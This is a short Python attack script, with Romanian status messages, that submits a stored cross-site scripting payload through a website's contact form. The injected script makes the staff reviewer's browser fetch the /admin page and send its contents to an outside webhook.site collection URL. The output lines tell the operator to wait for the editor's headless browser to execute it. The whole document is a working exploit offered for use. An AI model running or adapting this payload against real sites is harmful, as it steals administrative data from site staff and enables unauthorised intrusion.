import requests

TARGET = "http://your-website"
WEBHOOK = "https://webhook.site/your-link"

payload = f"<script>fetch('/admin').then(r=>r.text()).then(t=>fetch('{WEBHOOK}?data='+encodeURIComponent(t)))</script>"

form_data = {
    "name": "AuditBot",
    "email": "audit@test.internal",
    "message": payload
}

session = requests.Session()
r = session.post(f"{TARGET}/contact", data=form_data)

if r.status_code in [200, 302, 303]:
    print("[+] Payload trimis cu succes către formularul de contact.")
    print("[+] Așteaptă execuția headless browser-ului redactorului și verifică webhook-ul.")
else:
    print(f"[-] Eroare la trimitere. Status: {r.status_code}")
